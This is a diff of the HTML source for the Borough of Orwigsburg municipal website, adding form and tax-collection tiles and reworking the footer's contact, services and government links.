+</div></div><div id='stacks_out_192' class='stacks_out'><div id='stacks_in_192' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h5 class="text-center     " >Useful Forms</h5> 
+</div></div>
+
+
+  
+
+ 
+</div></li> 
+<li><div class="block-item"><!-- Total Toggle -->
+
+
+
+
+
+  
+	<div id='stacks_out_198' class='stacks_out'><div id='stacks_in_198' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../government/tax-collection"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/goverment-image-08.png"   src="https://orwigsburg.gov/cms-data/image/goverment-image-08-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/goverment-image-08-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/goverment-image-08-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+</div></div><div id='stacks_out_199' class='stacks_out'><div id='stacks_in_199' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h5 class="text-center     " >Tax Collection</h5> 
+</div></div>
+
+
+  
+
+ 
+</div></li> 
+<li><div class="block-item"><!-- Total Toggle -->
+
+
+
+
+
+  
+
+
+
+  
+
+ 
+</div></li> 
+<li><div class="block-item"><!-- Total Toggle -->
+
+
+
+
+
+  
+
+
+
+  
+
+ 
+</div></li> 
+<li><div class="block-item"><!-- Total Toggle -->
+
+
+
+
+
+  
+
+
+
+  
+
+ 
+</div></li> 
+<li><div class="block-item"><!-- Total Toggle -->
+
+
+
+
+
+  
+
+
+
+  
+
+ 
+</div></li> 
+ </ul> 
 </div></div> </div> </div> 
 </div></div> </div> </div> 
-</div></div><div id='stacks_out_255' class='stacks_out'><div id='stacks_in_255' class='stacks_in '><div id='stacks_out_255_1' class='stacks_out'><div id='stacks_in_255_1' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
+</div></div><div id='stacks_out_134' class='stacks_out'><div id='stacks_in_134' class='stacks_in '><div id='stacks_out_134_1' class='stacks_out'><div id='stacks_in_134_1' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
 <div class='row  collapse max-edge     '  > <div class='columns small-12      '> <div  class="sgw-footer" style=""> <!-- Total Toggle -->
 
 
@@ -466,7 +775,7 @@ if (is_bot()) {
 
 
   
-	<div id='stacks_out_255_47' class='stacks_out'><div id='stacks_in_255_47' class='stacks_in com_joeworkman_stacks_foundation_2col_s3_stack'> 
+	<div id='stacks_out_134_47' class='stacks_out'><div id='stacks_in_134_47' class='stacks_in com_joeworkman_stacks_foundation_2col_s3_stack'> 
 <div class='row   max-custom  '  > <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->
 
 
@@ -474,7 +783,7 @@ if (is_bot()) {
 
 
   
-	<div id='stacks_out_255_52' class='stacks_out'><div id='stacks_in_255_52' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../" title="Home"> <img loading="auto" class="   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/footer-logo.png"  src="https://orwigsburg.gov/cms-data/image/footer-logo-sq.png"   onerror="this.style.display='none'"  /> </a>   
+	<div id='stacks_out_134_52' class='stacks_out'><div id='stacks_in_134_52' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../" title="Home"> <img loading="auto" class="   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/footer-logo.png"  src="https://orwigsburg.gov/cms-data/image/footer-logo-sq.png"   onerror="this.style.display='none'"  /> </a>   
 
 
 
@@ -497,7 +806,7 @@ if (is_bot()) {
   
 
  
-  </div> <div class='columns small-12    medium-9     ' >  <div id='stacks_out_255_10' class='stacks_out'><div id='stacks_in_255_10' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h3>&nbsp; &nbsp;<br><br></h3><h1><strong>Borough Of Orwigsburg</strong></h1>    
+  </div> <div class='columns small-12    medium-9     ' >  <div id='stacks_out_134_10' class='stacks_out'><div id='stacks_in_134_10' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h3>&nbsp; &nbsp;<br><br></h3><h1><strong>Borough Of Orwigsburg</strong></h1>    
  
 </div></div>  </div> </div> 
 </div></div>
@@ -506,8 +815,8 @@ if (is_bot()) {
   
 
  
-<div id='stacks_out_255_41' class='stacks_out'><div id='stacks_in_255_41' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
-</div></div><div id='stacks_out_255_15' class='stacks_out'><div id='stacks_in_255_15' class='stacks_in com_joeworkman_stacks_foundation_4col_s3_stack'> 
+<div id='stacks_out_134_41' class='stacks_out'><div id='stacks_in_134_41' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
+</div></div><div id='stacks_out_134_15' class='stacks_out'><div id='stacks_in_134_15' class='stacks_in com_joeworkman_stacks_foundation_4col_s3_stack'> 
 <div class='row   max-custom  '  > <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->
 
 
@@ -515,7 +824,7 @@ if (is_bot()) {
 
 
   
-	<div id='stacks_out_255_22' class='stacks_out'><div id='stacks_in_255_22' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Contact Information</h4><p><strong>Address</strong><br>333 S. Liberty St.<br>Orwigsburg, Pa 17961</p><p><strong>Office Hours</strong><br>8:00 a.m. to 5:00 p.m.<br>Phone Hours<br>8:00 a.m. to 5: 00 p.m.<br><strong>Phone</strong><br>(570)-366-3103<br><strong>Fax</strong><br>(570)-366-3106<br><br><a href="/contact"><strong>Contact Form</strong></a></p><p><br><br><br></p>    
+	<div id='stacks_out_134_22' class='stacks_out'><div id='stacks_in_134_22' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Contact Information</h4><p><strong>Address</strong><br>333 S. Liberty St.<br>Orwigsburg, Pa 17961</p><p><strong>Office Hours</strong><br>8:00 a.m. to 5:00 p.m.<br>Phone Hours<br>8:00 a.m. to 5: 00 p.m.<br><strong>Phone</strong><br>(570)-366-3103<br><strong>Fax</strong><br>(570)-366-3106<br><br><a href="/contact"><strong>Contact Form</strong></a></p><p><br><br><br></p>    
  
 </div></div>
 
@@ -530,16 +839,7 @@ if (is_bot()) {
 
 
   
-	<div id='stacks_out_255_26' class='stacks_out'><div id='stacks_in_255_26' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Living &amp; Working</h4><p><a href="/history">Borough History<br></a><a href="/live/churches/">Churches</a><br><a href="/play/events/">Events</a><br><a href="/fyi">FYI Articles</a><br><a href="/government/employment/">Job Openings<br></a><a href="/live/library/">Library</a><br><a href="/live/orgs/">Organizations<br></a><a href="/play/parks-rec/">Parks &amp; Recreation<br></a><a href="/gallery">Photo Gallery<br></a><a href="/live/schools/">Schools</a><a href="/history"></a></p>    
- 
-</div></div></div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->
-
-
-
-
-
-  
-	<div id='stacks_out_255_30' class='stacks_out'><div id='stacks_in_255_30' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Services</h4><p><a href="/services/utility-payment/">Utility Payment<br></a><a href="/services/ambulance/">Ambulance Service<br></a><a href="/services/police/">Police Department</a><br><a href="/services/water/">Water Department<br></a><a href="/services/streets/">Streets Department</a><br><a href="/services/sewer/">Sewer Department</a><br><a href="/services/fire/">Fire Department</a><br><a href="/services/garbage-recycling/">Sanitation Department</a><br><a href="/services/swift/"></a><a href="https://www.smart911.com/smart911/ref/login.action?pa=orwigsburg">RAVE Mobile Safety</a></p><p><br><br><br></p>    
+	<div id='stacks_out_134_26' class='stacks_out'><div id='stacks_in_134_26' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Living &amp; Working</h4><p><a href="/history">Borough History<br></a><a href="/live/churches/">Churches</a><br><a href="/play/events/">Events</a><br><a href="/fyi">FYI Articles</a><br><a href="/government/employment/">Job Openings<br></a><a href="/live/library/">Library</a><br><a href="/live/orgs/">Organizations<br></a><a href="/play/parks-rec/">Parks &amp; Recreation<br></a><a href="/gallery">Photo Gallery<br></a><a href="/live/schools/">Schools</a><a href="/history"></a></p>    
  
 </div></div>
 
@@ -554,7 +854,22 @@ if (is_bot()) {
 
 
   
-	<div id='stacks_out_255_34' class='stacks_out'><div id='stacks_in_255_34' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Government</h4><p><a href="/government/forms/"></a><a href="/government/forms/">Borough Forms</a><br><a href="/government/officials/">Borough Officials</a><br><a href="/government/building-zoning/">Building/Zoning Codes</a><br><a href="/government/community-reports/">Community Reports</a><br><a href="/government/employment/">Employment</a><br><a href="/government/financials/">Financial Reports</a><br><a href="/government/gov-news">Government News</a><br><a href="/government/public-meetings/">Public Meetings</a><br><a href="/government/tax-collection/">Tax Collection</a> <br><br><br></p><p><br></p>    
+	<div id='stacks_out_134_30' class='stacks_out'><div id='stacks_in_134_30' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Services</h4><p><a href="/services/utility-payment/">Utility Payment<br></a><a href="/services/ambulance/">Ambulance Service<br></a><a href="/services/police/">Police Department</a><br><a href="/services/water/">Water Department<br></a><a href="/services/streets/">Streets Department</a><br><a href="/services/sewer/">Sewer Department</a><br><a href="/services/fire/">Fire Department</a><br><a href="/services/garbage-recycling/">Sanitation Department</a><br><a href="/services/swift/"></a><a href="https://www.smart911.com/smart911/ref/login.action?pa=orwigsburg">RAVE Mobile Safety</a></p><p><br><br><br></p>    
+ 
+</div></div>
+
+
+  
+
+ 
+  </div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->
+
+
+
+
+
+  
+	<div id='stacks_out_134_34' class='stacks_out'><div id='stacks_in_134_34' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Government</h4><p><a href="/government/forms/"></a><a href="/government/forms/">Borough Forms</a><br><a href="/government/officials/">Borough Officials</a><br><a href="/government/building-zoning/">Building/Zoning Codes</a><br><a href="/government/community-reports/">Community Reports</a><br><a href="/government/employment/">Employment</a><br><a href="/government/financials/">Financial Reports</a><br><a href="/government/gov-news">Government News</a><br><a href="/government/public-meetings/">Public Meetings</a><br><a href="/government/tax-collection/">Tax Collection</a> <br><br><br></p><p><br></p>    
  
 </div></div>
 
@@ -563,8 +878,8 @@ if (is_bot()) {
 
  
   </div> </div> 
-</div></div><div id='stacks_out_255_40' class='stacks_out'><div id='stacks_in_255_40' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
-</div></div><div id='stacks_out_255_2' class='stacks_out'><div id='stacks_in_255_2' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
+</div></div><div id='stacks_out_134_40' class='stacks_out'><div id='stacks_in_134_40' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
+</div></div><div id='stacks_out_134_2' class='stacks_out'><div id='stacks_in_134_2' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
 <div class='row  collapse max-custom     '  > <div class='columns small-12  small-centered      '> <!-- Total Toggle -->
 
 
@@ -579,9 +894,9 @@ if (is_bot()) {
 
  
  </div> </div> 
-</div></div><div id='stacks_out_255_42' class='stacks_out'><div id='stacks_in_255_42' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
+</div></div><div id='stacks_out_134_42' class='stacks_out'><div id='stacks_in_134_42' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
 </div></div> </div>  
-<div  class="sgw-developer" style=""> <div id='stacks_out_255_8' class='stacks_out'><div id='stacks_in_255_8' class='stacks_in com_joeworkman_stacks_foundation_footertext_stack'><p class="copyright text-right ">  Site Design: <a href="https://cottsinc.com">&copy; 2018 Cotts, Inc Digital Marketing | </a> </p> 
+<div  class="sgw-developer" style=""> <div id='stacks_out_134_8' class='stacks_out'><div id='stacks_in_134_8' class='stacks_in com_joeworkman_stacks_foundation_footertext_stack'><p class="copyright text-right ">  Site Design: <a href="https://cottsinc.com">&copy; 2018 Cotts, Inc Digital Marketing | </a> </p> 
 </div></div> </div>  
  </div> </div> 
 </div></div></div></div></div></div><!--  -->
